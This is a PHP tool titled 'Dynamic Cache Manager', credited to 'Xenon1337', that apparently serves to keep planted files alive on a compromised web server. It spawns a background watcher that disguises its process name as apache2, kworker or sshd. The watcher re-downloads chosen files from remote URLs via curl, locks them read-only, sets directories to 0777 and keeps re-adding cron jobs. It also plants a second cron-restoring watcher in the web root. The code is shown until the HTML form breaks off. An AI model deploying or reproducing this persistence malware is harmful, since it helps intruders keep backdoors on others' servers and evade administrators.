<?php
session_start();
// Helper functions (assuming these exist or define them)
if (!function_exists('try_execute_command')) {
    function try_execute_command($cmd) {
        if (!function_exists('shell_exec')) return null;
        $disabled = ini_get('disable_functions');
        if ($disabled && strpos($disabled, 'shell_exec') !== false) return null;
        return @shell_exec($cmd . ' 2>&1');
    }
}
if (!function_exists('custom_escapeshellarg')) {
    function custom_escapeshellarg($arg) {
        return escapeshellarg($arg);
    }
}
if (!function_exists('htmlspecialchars_fn')) {
    function htmlspecialchars_fn($str) {
        return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
    }
}
if (!function_exists('deleteDirectoryRecursive')) {
    function deleteDirectoryRecursive($dir) {
        if (!is_dir($dir)) return;
        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            is_dir($path) ? deleteDirectoryRecursive($path) : unlink($path);
        }
        rmdir($dir);
    }
}
if (!function_exists('is_path_allowed_by_basedir')) {
    function is_path_allowed_by_basedir($path) {
        return true; // Simplified for demo
    }
}
// Find PHP CLI binary - MOVED TO TOP TO AVOID UNDEFINED FUNCTION ERROR
if (!function_exists('find_php_cli_binary')) {
    function find_php_cli_binary() {
        $common_paths = ['/usr/bin/php', '/usr/local/bin/php', '/bin/php', 'php'];
        foreach (['8.2', '8.1', '8.0', '7.4', '7.3', '7.2'] as $version) {
            $v = str_replace('.', '', $version);
            array_unshift($common_paths, "/usr/bin/php{$version}", "/usr/local/bin/php{$version}", "/opt/remi/php{$v}/root/usr/bin/php");
        }
        if (defined('PHP_BINARY') && !empty(PHP_BINARY)) {
            $output = @shell_exec(escapeshellarg(PHP_BINARY) . ' -v');
            if ($output && stripos($output, 'cli') !== false) return PHP_BINARY;
        }
        foreach (array_unique($common_paths) as $path) {
            $output = @shell_exec('command -v ' . escapeshellarg($path));
            if (!empty($output)) {
                $path = trim($output);
                $version_output = @shell_exec(escapeshellarg($path) . ' -v');
                if ($version_output && stripos($version_output, 'cli') !== false) return $path;
            }
        }
        return false;
    }
}
// Dynamic names
$dynamic_names = [
    'dir_name' => 'cache_mgr_' . bin2hex(random_bytes(4)),
    'log_name' => 'cache_mgr.log',
    'script_name' => 'cache_watcher.php',
    'watcher_name' => 'l4_watcher.php',
    'cron_prefix' => 'CACHE_MGR_'
];
// Action handling
$action_post = $_POST['action'] ?? '';
$active_menu = $_POST['active_menu'] ?? $_GET['menu'] ?? 'dynamic_cache_manager'; // Allow menu switch via GET/POST
$output_messages = [];
$error_messages = [];
$is_active = isset($_SESSION['cache_active']) && $_SESSION['cache_active'];
$show_process_killed_button = false; // Flag untuk tampilkan button Process Killed
$selected_kill_method = $_POST['kill_method'] ?? ''; // Metode kill yang dipilih
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($action_post === 'start_protection' && $active_menu === 'dynamic_cache_manager') {
        $targets = $_POST['targets'] ?? [];
        $urls = $_POST['urls'] ?? [];
        $interval = (int)($_POST['interval'] ?? 5);
        if ($interval < 2) $interval = 2;
        $filesToProtect = [];
        $cronCommandsToAdd = [];
        $php_binary_path = find_php_cli_binary(); // Now defined above
        $cache_base_dir = null;
        $tmp_path = sys_get_temp_dir();
        if (is_path_allowed_by_basedir($tmp_path) && is_writable($tmp_path)) {
            $cache_base_dir = $tmp_path . '/' . $dynamic_names['dir_name'];
            $log_filepath = $tmp_path . '/' . bin2hex(random_bytes(6)) . '.log';
        } else {
            $cache_base_dir = __DIR__ . '/' . $dynamic_names['dir_name'];
            $log_filepath = $cache_base_dir . '/' . $dynamic_names['log_name'];
        }
        if (!is_dir($cache_base_dir)) {
            if (!mkdir($cache_base_dir, 0777, true)) {
                $error_messages[] = "Gagal membuat direktori cache.";
            } else {
                chmod($cache_base_dir, 0777);
                if (strpos($cache_base_dir, __DIR__) === 0) {
                    file_put_contents($cache_base_dir . '/.htaccess', 'Deny from all');
                }
            }
        } else {
            chmod($cache_base_dir, 0777);
        }
        $unique_cron_instance_id = bin2hex(random_bytes(4));
        for ($i = 0; $i < count($targets); $i++) {
            if (!empty($targets[$i]) && !empty($urls[$i]) && filter_var($urls[$i], FILTER_VALIDATE_URL)) {
                $full_target_path = $targets[$i];
                if (strtolower($full_target_path) === '__file__') {
                    $full_target_path = __FILE__;
                } elseif (strpos($full_target_path, DIRECTORY_SEPARATOR) === false && !empty($full_target_path)) {
                    $full_target_path = __DIR__ . DIRECTORY_SEPARATOR . $full_target_path;
                }
                if (!is_file($full_target_path) && !is_dir(dirname($full_target_path))) {
                    $error_messages[] = "Target '{$targets[$i]}' tidak valid.";
                    continue;
                }
                $filesToProtect[] = ['target' => $full_target_path, 'backupUrl' => $urls[$i]];
                // Simplified cron generation (adapt from bash)
                $cronCommandsToAdd[] = "*/{$interval} * * * * [ ! -f {$full_target_path} ] && curl -s -o {$full_target_path} {$urls[$i]} && chmod 444 {$full_target_path} #{$dynamic_names['cron_prefix']}{$unique_cron_instance_id}";
            }
        }
        $cronCommandsToAdd = array_unique($cronCommandsToAdd);
        if (empty($filesToProtect) && empty($error_messages)) {
            $error_messages[] = "Tidak ada target valid.";
        }
        if (!empty($filesToProtect) && empty($error_messages)) {
            $filesToProtectPHPCode = var_export($filesToProtect, true);
            $cronCommandsPHPCode = var_export($cronCommandsToAdd, true);
            $dynamicNamesPHPCode = var_export($dynamic_names, true);
            $fakeProcessTitles = var_export(['/usr/sbin/apache2 -k start', '[kworker/u8:2]', '[rcu_sched]', 'nginx: worker process', 'php-fpm: pool www', '/usr/sbin/sshd -D'], true);
            // Watcher code from example - FIXED: Complete heredoc
            $cache_code = <<<EOT
<?php
set_time_limit(0);
ignore_user_abort(true);
date_default_timezone_set('Asia/Jakarta');
if (function_exists('cli_set_process_title')) {
    \$fake_titles = $fakeProcessTitles;
    @cli_set_process_title(\$fake_titles[array_rand(\$fake_titles)]);
}
// [PERBAIKAN] Gunakan flock untuk mencegah proses ganda
\$lock_file = __FILE__ . '.lock';
\$lock_handle = fopen(\$lock_file, 'c');
if (!\$lock_handle || !flock(\$lock_handle, LOCK_EX | LOCK_NB)) {
    echo "[".date("H:i:s")."] ⚠️ Proses lain sudah berjalan. Keluar.\\n";
    exit;
}
\$filesToProtect = $filesToProtectPHPCode;
\$cronCommandsToEnsure = $cronCommandsPHPCode;
\$dynamic_names = $dynamicNamesPHPCode;
\$interval = $interval;
function is_shell_exec_available() {
    if (!function_exists('shell_exec')) return false;
    \$disabled = ini_get('disable_functions');
    if (\$disabled) {
        \$disabled_arr = array_map('trim', explode(',', \$disabled));
        return !in_array('shell_exec', \$disabled_arr);
    }
    return true;
}
function fetchContent(\$url) {
    if (!function_exists('curl_init')) {
        echo "[".date("H:i:s")."] ❌ Ekstensi cURL tidak tersedia.\\n";
        return false;
    }
    \$ch = curl_init(\$url);
    curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt(\$ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt(\$ch, CURLOPT_TIMEOUT, 20);
    curl_setopt(\$ch, CURLOPT_USERAGENT, 'CacheManager/1.1');
    \$data = curl_exec(\$ch);
    \$http_code = curl_getinfo(\$ch, CURLINFO_HTTP_CODE);
    \$error = curl_error(\$ch);
    curl_close(\$ch);
    if (\$data === false || \$http_code !== 200) {
        echo "[".date("H:i:s")."] ❌ Gagal ambil backup dari {\$url}. HTTP:{\$http_code}. Error: {\$error}\\n";
        return false;
    }
    return \$data;
}
function ensureDirPermsRecursive(\$dirPath, \$perm = 0777, \$currentDepth = 0, \$maxDepth = 7) {
    if (\$currentDepth > \$maxDepth || !\$dirPath || \$dirPath === '.' || \$dirPath === '..' ) return;
    if (is_link(\$dirPath)) return;
    if (is_dir(\$dirPath)) {
        // [PERBAIKAN] Konversi izin ke string oktal dengan benar
        \$current_perms_octal_str = substr(sprintf('%o', @fileperms(\$dirPath)), -4);
        if (\$current_perms_octal_str !== '0777' && \$current_perms_octal_str !== '777') {
             echo "[".date("H:i:s")."] 📂 Izin dir '{\$dirPath}' adalah '{\$current_perms_octal_str}', ubah ke 0777.\\n";
             @chmod(\$dirPath, \$perm);
        }
    }
    \$parentDir = dirname(\$dirPath);
    if (\$parentDir !== \$dirPath && \$parentDir !== '/') {
        ensureDirPermsRecursive(\$parentDir, \$perm, \$currentDepth + 1, \$maxDepth);
    }
}
function writeAndLock(\$path, \$content) {
    \$folder_of_path = dirname(\$path);
    if (!is_dir(\$folder_of_path)) {
        @mkdir(\$folder_of_path, 0777, true);
        ensureDirPermsRecursive(\$folder_of_path, 0777);
    }
    if (@file_put_contents(\$path, \$content) !== false) {
        @chmod(\$path, 0444);
        return true;
    }
    return false;
}
echo "=============================================\\n";
echo "🛡️ System Cache Process Started: ".date("Y-m-d H:i:s")."\\n";
echo "🛡️ Cache Script: {\$dynamic_names['script_name']} in " . dirname(__FILE__) . "/\\n";
echo "=============================================\\n";
foreach (\$filesToProtect as \$file) {
    echo "- Target: " . \$file['target'] . "\\n Backup: " . \$file['backupUrl'] . "\\n";
}
echo "=============================================\\n";
flush();
while (true) {
    foreach (\$filesToProtect as \$file) {
        \$targetFile = \$file['target'];
        \$backupFileUrl = \$file['backupUrl'];
        \$targetDir = dirname(\$targetFile);
        echo "[".date("H:i:s")."] 🔍 Cek: " . basename(\$targetFile);
        // [PERBAIKAN] Panggil chmod sebelum cek file
        ensureDirPermsRecursive(\$targetDir, 0777);
        if (!file_exists(\$targetFile)) {
            echo " -> 🚨 HILANG! Memulihkan...\\n";
            \$data = fetchContent(\$backupFileUrl);
            if (\$data !== false) {
                if (writeAndLock(\$targetFile, \$data)) {
                    echo "[".date("H:i:s")."] ✅ Berhasil dipulihkan dan file dikunci ke 0444: \$targetFile\\n";
                } else {
                    echo "[".date("H:i:s")."] ❌ GAGAL menulis file ke lokasi: \$targetFile\\n";
                }
            }
        } else {
            // [PERBAIKAN] Cek izin dengan benar
            \$current_perms_file = substr(sprintf('%o', @fileperms(\$targetFile)), -4);
            if (\$current_perms_file !== '0444' && \$current_perms_file !== '444') {
                @chmod(\$targetFile, 0444);
                echo " -> 🔓 Izin diubah! Mengunci ulang ke 0444.\\n";
            } else {
                echo " -> ✅ File aman.\\n";
            }
        }
        flush();
    }
    if (is_shell_exec_available()) {
        \$current_crontab = shell_exec('crontab -l 2>/dev/null');
        \$missing_crons = false;
        foreach(\$cronCommandsToEnsure as \$cron_command) {
            if (strpos(\$current_crontab, \$cron_command) === false) {
                echo "[".date("H:i:s")."] 🚨 CRON HILANG: " . htmlentities(substr(\$cron_command, 0, 70)) . "...\\n";
                \$escaped_cron_command = str_replace("'", "'\\''", \$cron_command);
                shell_exec('(crontab -l 2>/dev/null; echo \'' . \$escaped_cron_command . '\') | crontab -');
                \$missing_crons = true;
            }
        }
        if (!\$missing_crons) {
            echo "[".date("H:i:s")."] ✅ Semua cron job aman.\\n";
        } else {
            echo "[".date("H:i:s")."] ✅ Cron job yang hilang telah dipulihkan.\\n";
        }
    } else {
        echo "[".date("H:i:s")."] ⚠️ Tidak dapat memeriksa cron job, shell_exec dinonaktifkan.\\n";
    }
    echo "------------------ Tidur selama {\$interval} detik ------------------\\n";
    flush();
    sleep(\$interval);
}
// Melepas lock saat skrip selesai
flock(\$lock_handle, LOCK_UN);
fclose(\$lock_handle);
@unlink(\$lock_file);
EOT;
            $_SESSION['cache_code_template'] = $cache_code;
            $cache_script_filepath = $cache_base_dir . '/' . $dynamic_names['script_name'];
            if (file_put_contents($cache_script_filepath, $cache_code)) {
                chmod($cache_script_filepath, 0755);
                $process_started = false;
                $method_used = '';
                if ($php_binary_path && function_exists('shell_exec')) {
                    $safe_script_path = custom_escapeshellarg($cache_script_filepath);
                    $safe_log_path = custom_escapeshellarg($log_filepath);
                    $command_run = "nohup {$php_binary_path} {$safe_script_path} > {$safe_log_path} 2>&1 & echo $!";
                    $pid = trim(shell_exec($command_run));
                    if ($pid && is_numeric($pid)) {
                        $process_started = true;
                        $method_used = "Nohup (PID: " . $pid . ")";
                    }
                }
                // Fallback curl trigger if needed
                if (!$process_started && function_exists('curl_init')) {
                    $url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
                    $url .= (strpos($url, '?') === false ? '?' : '&') . 'run_background_cache=' . urlencode($cache_script_filepath);
                    $ch = curl_init();
                    curl_setopt_array($ch, [
                        CURLOPT_URL => $url,
                        CURLOPT_FRESH_CONNECT => true,
                        CURLOPT_TIMEOUT_MS => 500,
                        CURLOPT_NOSIGNAL => 1,
                    ]);
                    curl_exec($ch);
                    curl_close($ch);
                    $process_started = true;
                    $method_used = "ignore_user_abort (triggered via cURL)";
                }
                // Add crons
                if (function_exists('shell_exec')) {
                    $existing_crontab = try_execute_command('crontab -l');
                    $new_crontab_content = $existing_crontab ? trim($existing_crontab) . "\n" : "";
                    foreach ($cronCommandsToAdd as $command) {
                        if (strpos($new_crontab_content, $command) === false) {
                            $new_crontab_content .= $command . "\n";
                        }
                    }
                    $temp_cron_file = tempnam(sys_get_temp_dir(), 'cron');
                    file_put_contents($temp_cron_file, $new_crontab_content);
                    try_execute_command('crontab ' . escapeshellarg($temp_cron_file));
                    unlink($temp_cron_file);
                    $output_messages[] = "Cron job berhasil diatur.";
                }
                // Deploy L4 watcher (simplified)
                $doc_root = $_SERVER['DOCUMENT_ROOT'];
                $watcher_filepath = $doc_root . '/' . $dynamic_names['watcher_name'];
                $watcher_code = '<?php $c = ' . var_export(implode("\n", $cronCommandsToAdd), true) . '; $cc = @shell_exec("crontab -l"); if (strpos($cc, $c) === false) { $t = tempnam("/tmp", "c"); file_put_contents($t, $c); shell_exec("crontab " . $t); @unlink($t); } ?>';
                if (file_put_contents($watcher_filepath, $watcher_code)) {
                    chmod($watcher_filepath, 0444);
                    $new_cron_line = "*/5 * * * * " . escapeshellarg($php_binary_path ?: 'php') . " " . escapeshellarg($watcher_filepath);
                    $current_crontab = @shell_exec('crontab -l');
                    if (strpos($current_crontab, $new_cron_line) === false) {
                        shell_exec('(crontab -l 2>/dev/null; echo ' . escapeshellarg($new_cron_line) . ') | crontab -');
                    }
                    $_SESSION['l4_watcher_path'] = $watcher_filepath;
                    $output_messages[] = "L4 watcher dideploy.";
                }
                if ($process_started) {
                    $_SESSION['cache_active'] = true;
                    $_SESSION['cache_dir_path'] = $cache_base_dir;
                    $_SESSION['cache_log_path'] = $log_filepath;
                    $_SESSION['cache_script_name'] = $dynamic_names['script_name'];
                    $_SESSION['cache_cron_id'] = "#" . $dynamic_names['cron_prefix'] . $unique_cron_instance_id;
                    $output_messages[] = "Proses dimulai: {$method_used}. Log: {$log_filepath}";
                } else {
                    $error_messages[] = "Gagal start proses, tapi cron & L4 OK.";
                }
            } else {
                $error_messages[] = "Gagal buat script cache.";
            }
        }
    } elseif ($action_post === 'stop_protection' && $active_menu === 'dynamic_cache_manager') {
        if (isset($_SESSION['cache_dir_path'])) {
            $cache_dir_to_stop = $_SESSION['cache_dir_path'];
            $log_path_to_stop = $_SESSION['cache_log_path'];
            $script_name_to_stop = $_SESSION['cache_script_name'];
            $cron_id_to_stop = $_SESSION['cache_cron_id'];
            $full_script_path_to_stop = $cache_dir_to_stop . DIRECTORY_SEPARATOR . $script_name_to_stop;
            $grep_pattern = '[' . substr($script_name_to_stop, 0, 1) . ']' . substr($script_name_to_stop, 1);
            $ps_command = "ps aux | grep '{$grep_pattern}'";
            $ps_output = try_execute_command($ps_command);
             if (!empty($ps_output)) {
                $lines = explode("\n", trim($ps_output));
                foreach ($lines as $line) {
                    if(strpos($line, $full_script_path_to_stop) !== false || strpos($line, $script_name_to_stop) !== false) {
                        $parts = preg_split('/\s+/', trim($line));
                        if (count($parts) > 1 && is_numeric($parts[1])) {
                            $pid = $parts[1];
                            try_execute_command("kill -9 {$pid}");
                            $output_messages[] = "Proses cache manager dengan PID {$pid} (skrip: {$script_name_to_stop}) berhasil dihentikan.";
                        }
                    }
                }
            } else {
                $output_messages[] = "Tidak ada proses cache manager yang cocok ditemukan, mungkin sudah berhenti.";
            }
            try_execute_command("killall -9 " . escapeshellarg($script_name_to_stop));
            $current_crontab = try_execute_command('crontab -l');
            if ($current_crontab) {
                $new_crontab_lines = [];
                $changed_crontab = false;
                $cron_prefix_to_remove = $dynamic_names['cron_prefix'];
                $watcher_name_to_remove = $dynamic_names['watcher_name'];
                foreach (explode("\n", $current_crontab) as $line) {
                    if (strpos($line, "#" . $cron_prefix_to_remove) === false && strpos($line, $watcher_name_to_remove) === false) {
                        $new_crontab_lines[] = $line;
                    } else {
                        $changed_crontab = true;
                    }
                }
                if ($changed_crontab) {
                    $new_crontab_content = implode("\n", $new_crontab_lines);
                    $temp_cron_file = tempnam(sys_get_temp_dir(), 'cron');
                    file_put_contents($temp_cron_file, $new_crontab_content);
                    try_execute_command('crontab ' . escapeshellarg($temp_cron_file));
                    unlink($temp_cron_file);
                    $output_messages[] = "Semua cron job terkait cache manager & watcher telah dihapus.";
                }
            }
           
            if (is_dir($cache_dir_to_stop)) {
                deleteDirectoryRecursive($cache_dir_to_stop);
            }
            if (file_exists($log_path_to_stop)) {
                @unlink($log_path_to_stop);
            }
            if(isset($_SESSION['l4_watcher_path'])) {
                if(file_exists($_SESSION['l4_watcher_path'])) {
                    @unlink($_SESSION['l4_watcher_path']);
                }
            }
           
            unset($_SESSION['cache_active'], $_SESSION['cache_dir_path'], $_SESSION['cache_log_path'], $_SESSION['cache_script_name'], $_SESSION['cache_cron_id'], $_SESSION['cache_code_template'], $_SESSION['l4_watcher_path']);
            $output_messages[] = "Direktori, file log, dan watcher cache manager telah dihapus.";
        } else {
            $error_messages[] = "Tidak ada informasi sesi cache manager yang ditemukan untuk dihentikan.";
        }
    } elseif ($action_post === 'kill_process' && $active_menu === 'process_manager') {
        $pid = (int)$_POST['pid'];
        if ($pid > 0) {
            $output = try_execute_command("kill -9 " . $pid);
            if ($output !== null) {
                $output_messages[] = "Berhasil mengirim sinyal kill ke PID {$pid}. Output: <pre>" . $htmlspecialchars_fn($output) . "</pre>";
            } else {
                $output_messages[] = "Sinyal kill telah dikirim ke PID {$pid} (tanpa output).";
            }
        } else {
            $error_messages[] = "PID tidak valid.";
        }
    } elseif ($action_post === 'kill_selected_cronjob' && $active_menu === 'cronjob_manager') {
        $selected_lines = $_POST['selected_crons'] ?? [];
        $kill_method = $_POST['kill_method'] ?? 'standard';
        $valid_methods = ['standard', 'purge_rebuild', 'disable_lock', 'kill_processes'];
        if (!in_array($kill_method, $valid_methods)) {
            $error_messages[] = "Metode kill '{$kill_method}' tidak valid. Gunakan salah satu: " . implode(', ', $valid_methods) . ".";
        } elseif (!empty($selected_lines)) {
            $current_crontab = try_execute_command('crontab -l 2>/dev/null');
            if ($current_crontab === null) {
                $error_messages[] = "Gagal mengakses crontab.";
            } else {
                $lines = array_filter(array_map('trim', explode("\n", trim($current_crontab))), 'strlen'); // Clean lines: trim & filter empty
                $new_lines = [];
                $deleted_count = 0;
                $patterns_to_remove = [];
                $selected_lines = array_map('intval', $selected_lines); // Ensure numeric indices
                $selected_lines = array_unique($selected_lines);
                foreach ($lines as $index => $line) {
                    if (!in_array($index, $selected_lines)) {
                        $new_lines[] = $line;
                    } else {
                        $deleted_count++;
                        if (preg_match('/#CACHE_MGR_([a-f0-9]+)/', $line, $matches)) {
                            $patterns_to_remove[] = $matches[1];
                        }
                    }
                }
                $new_crontab_content = implode("\n", $new_lines) . "\n";
                $temp_cron_file = tempnam(sys_get_temp_dir(), 'cron');
                file_put_contents($temp_cron_file, $new_crontab_content);
                $result = try_execute_command('crontab ' . escapeshellarg($temp_cron_file));
                unlink($temp_cron_file);
                if ($result !== null && strpos($result, 'no crontab') !== false && !empty($new_lines)) {
                    $error_messages[] = "Gagal update crontab. Output: " . htmlspecialchars_fn($result);
                } else {
                    $output_messages[] = "Berhasil hapus {$deleted_count} cronjob menggunakan metode: {$kill_method}.";

                    // Validasi post-kill: Cek jika line masih ada
                    $post_crontab = try_execute_command('crontab -l 2>/dev/null');
                    $post_lines = array_filter(array_map('trim', explode("\n", trim($post_crontab))), 'strlen');
                    $still_exists = 0;
                    foreach ($selected_lines as $idx) {
                        if (isset($lines[$idx]) && strpos($post_crontab, $lines[$idx]) !== false) {
                            $still_exists++;
                        }
                    }
                    if ($still_exists > 0) {
                        $error_messages[] = "{$still_exists} cronjob masih ada setelah hapus. Coba metode 'purge_rebuild'.";
                    } else {
                        $output_messages[] = "Verifikasi: Cronjob terhapus sepenuhnya.";
                    }
                }

                // Hapus watcher berdasarkan pattern
                $doc_root = $_SERVER['DOCUMENT_ROOT'];
                foreach ($patterns_to_remove as $pattern) {
                    $watcher_file = $doc_root . '/l4_watcher_' . $pattern . '.php';
                    if (file_exists($watcher_file)) {
                        unlink($watcher_file);
                        $output_messages[] = "Watcher {$watcher_file} dihapus.";
                    }
                    // Juga cek watcher utama
                    $watcher_file_main = $doc_root . '/' . $dynamic_names['watcher_name'];
                    if (file_exists($watcher_file_main)) {
                        $watcher_content = file_get_contents($watcher_file_main);
                        if (strpos($watcher_content, $pattern) !== false) {
                            unlink($watcher_file_main);
                            $output_messages[] = "Watcher utama dihapus karena terkait pattern {$pattern}.";
                        }
                    }
                }

                // Metode spesifik
                if ($kill_method === 'purge_rebuild') {
                    try_execute_command('crontab -r');
                    if (!empty($new_lines)) {
                        file_put_contents($temp_cron_file, $new_crontab_content);
                        try_execute_command('crontab ' . escapeshellarg($temp_cron_file));
                    }
                    $output_messages[] = "Crontab dibersihkan dan dibangun ulang.";
                } elseif ($kill_method === 'disable_lock') {
                    $lock_file = sys_get_temp_dir() . '/cron_disable_' . bin2hex(random_bytes(4)) . '.lock';
                    file_put_contents($lock_file, json_encode($selected_lines));
                    $output_messages[] = "Cron di-disable via lock: {$lock_file}. Hapus file untuk enable.";
                } elseif ($kill_method === 'kill_processes') {
                    // Kill proses terkait (lihat action terpisah)
                    $show_process_killed_button = true;
                }
            }
        } else {
            $error_messages[] = "Tidak ada cron job yang dipilih untuk dihapus.";
        }
    } elseif ($action_post === 'process_killed' && $active_menu === 'cronjob_manager') {
        $selected_lines = $_POST['selected_crons'] ?? [];
        if (!empty($selected_lines)) {
            $current_crontab = try_execute_command('crontab -l 2>/dev/null');
            $lines = array_filter(array_map('trim', explode("\n", trim($current_crontab))), 'strlen');
            $killed_count = 0;
            foreach ($selected_lines as $index) {
                $index = intval($index);
                if (isset($lines[$index]) && trim($lines[$index]) !== '') {
                    $cron_line = $lines[$index];
                    $parts = preg_split('/\s+/', trim($cron_line), 6);
                    if (count($parts) >= 6) {
                        $command = $parts[5];
                        $patterns = [$command, 'curl -s -o', 'chmod 444', 'semutmerah.store', basename($parts[5])]; // Tambah pattern spesifik untuk cron Anda
                        foreach ($patterns as $pattern) {
                            $ps_command = "ps aux | grep " . escapeshellarg($pattern) . " | grep -v grep";
                            $ps_output = try_execute_command($ps_command);
                            if (!empty($ps_output)) {
                                $ps_lines = explode("\n", trim($ps_output));
                                foreach ($ps_lines as $ps_line) {
                                    if (trim($ps_line) !== '') {
                                        $ps_parts = preg_split('/\s+/', trim($ps_line), 2);
                                        if (count($ps_parts) >= 2 && is_numeric($ps_parts[0])) {
                                            $pid = $ps_parts[0];
                                            try_execute_command("kill -9 " . $pid);
                                            $killed_count++;
                                            $output_messages[] = "Killed PID {$pid} untuk cron: " . htmlspecialchars_fn(substr($cron_line, 0, 50));
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if ($killed_count > 0) {
                $output_messages[] = "Berhasil kill {$killed_count} proses terkait cron terpilih.";
            } else {
                $output_messages[] = "Tidak ada proses aktif untuk cron terpilih.";
            }
        }
    }
}
// Get log content if active
$log_content = '';
if ($is_active && isset($_SESSION['cache_log_path']) && file_exists($_SESSION['cache_log_path'])) {
    $log_content = file_get_contents($_SESSION['cache_log_path']);
}
// Append output_messages to log if starting (for console-like display)
if ($action_post === 'start_protection' && !empty($output_messages)) {
    $log_content .= "\n=== OUTPUT MESSAGES FROM START ===\n";
    foreach ($output_messages as $msg) {
        $log_content .= date('Y-m-d H:i:s') . " [INFO] " . $msg . "\n";
    }
    if (isset($_SESSION['cache_log_path']) && file_exists($_SESSION['cache_log_path'])) {
        file_put_contents($_SESSION['cache_log_path'], $log_content, FILE_APPEND | LOCK_EX);
    }
}
// Get current crontab for cronjob_manager
$current_crontab_lines = [];
if ($active_menu === 'cronjob_manager') {
    $current_crontab = try_execute_command('crontab -l 2>/dev/null');
    if ($current_crontab) {
        $current_crontab_lines = array_filter(array_map('trim', explode("\n", trim($current_crontab))), 'strlen');
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dynamic Cache Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: linear-gradient(to bottom, #ffffff, #f0f8f0); color: #000; padding: 20px; line-height: 1.6; }
        .container { max-width: 1200px; margin: 0 auto; background: #fff; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); overflow: hidden; }
        header { background: #28a745; color: #fff; padding: 20px; text-align: center; }
        header h1 { margin: 0; }
        nav { background: #218838; padding: 10px; text-align: center; }
        nav a { color: #fff; margin: 0 15px; text-decoration: none; font-weight: bold; }
        nav a.active { text-decoration: underline; }
        .form-section { padding: 20px; border-bottom: 1px solid #ddd; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #28a745; }
        input[type="text"], input[type="number"], textarea, select { width: 100%; padding: 10px; border: 1px solid #28a745; border-radius: 5px; }
        .add-field { background: #28a745; color: #fff; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; margin-top: 10px; }
        .btn { background: #28a745; color: #fff; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px 5px; transition: background 0.3s; }
        .btn:hover { background: #218838; }
        .btn-stop { background: #dc3545; color: #fff !important; border-color: #dc3545; }
        .btn-stop:hover { background: #c82333; }
        .btn-refresh { background: #007bff; color: #fff; }
        .btn-refresh:hover { background: #0056b3; }
        .messages { padding: 20px; }
        .message { padding: 10px; margin: 10px 0; border-radius: 5px; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .log-section { padding: 20px; background: #f8f9fa; }
        .terminal { background: #000; color: #fff; font-family: 'Courier New', monospace; padding: 15px; border-radius: 5px; height: 400px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; }
        .btn-container { display: flex; gap: 10px; margin-top: 10px; }
        .table-responsive { overflow-x: auto; margin-bottom: 20px; }
        .cron-table { width: 100%; min-width: 600px; border-collapse: collapse; }
        .cron-table th, .cron-table td { border: 1px solid #ddd; padding: 8px; text-align: left; vertical-align: top; }
        .cron-table th { background: #f8f9fa; }
        .cron-line { 
            max-width: 600px; 
            overflow-x: auto; 
            white-space: nowrap; 
            display: block; 
            font-family: 'Courier New', monospace; 
            font-size: 12px; 
            padding: 4px; 
            background: #f8f9fa; 
            border-radius: 3px; 
            word-break: break-all; 
        }
        .cron-line::-webkit-scrollbar {
            height: 8px;
        }
        .cron-line::-webkit-scrollbar-track {
            background: #f1f1f1;
        }
        .cron-line::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 4px;
        }
        .cron-line::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
        @media (max-width: 768px) { 
            .container { margin: 10px; } 
            .form-section { padding: 10px; } 
            .btn-container { flex-direction: column; } 
            .cron-table th, .cron-table td { padding: 4px; font-size: 12px; }
            .cron-line { max-width: 300px; }
        }
    </style>
    <script>
        let fieldCount = 1;
        function addField() {
            fieldCount++;
            const container = document.getElementById('fields-container');
            container.innerHTML += `
                <div class="form-group">
                    <label>File Target ${fieldCount}:</label>
                    <input type="text" name="targets[]" placeholder="e.g., /var/www/html/index.php atau __file__">
                </div>
                <div class="form-group">
                    <label>URL Backup ${fieldCount}:</label>
                    <input type="text" name="urls[]" placeholder="e.g., http://backup.com/file.php">
                </div>
            `;
        }
        function refreshLog() {
            location.reload(); // Simple reload to refresh log
        }
        function toggleAll(source) {
            const checkboxes = document.querySelectorAll('input[type="checkbox"][name="selected_crons[]"]');
            for (let i = 0; i < checkboxes.length; i++) {
                checkboxes[i].checked = source.checked;
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <header>
            <h1>🛡️ Dynamic Cache Manager</h1>
            <p>Coder By Xenon1337 | Telegram t.me/nome6969</p>
        </header>
        <nav>
            <a href="?menu=dynamic_cache_manager" class="<?php echo $active_menu === 'dynamic_cache_manager' ? 'active' : ''; ?>">Dynamic Cache Manager</a>
            <a href="?menu=cronjob_manager" class="<?php echo $active_menu === 'cronjob_manager' ? 'active' : ''; ?>">Management Cronjob</a>
        </nav>
        <?php if ($active_menu === 'dynamic_cache_manager'): ?>
            <form method="POST" class="form-section">
                <input type="hidden" name="action" value="start_protection">
                <input type="hidden" name="active_menu" value="dynamic_cache_manager">
                <div id="fields-container">
                    <div class="form-group">
                        <label>File Target 1:</label>
                        <input type="text" name="targets[]" placeholder="e.g., /var/www/html/index.php atau __file__" required>
                    </div>
                    <div class="form-group">
                        <label>URL Backup 1:</label>
                        <input type="text" name="urls[]" placeholder="e.g., http://backup.com/file.php" required>
                    </div>
                </div>
                <button type="button" class="add-field" onclick="addField()">+ Tambah Target</button>
                <div class="form-group">
                    <label>Interval Cek (detik):</label>
                    <input type="number" name="interval" value="5" min="2" required>
                </div>
                <?php if (!$is_active): ?>
                    <button type="submit" class="btn">Mulai Proses Cronjob</button>
                <?php endif; ?>
            </form>
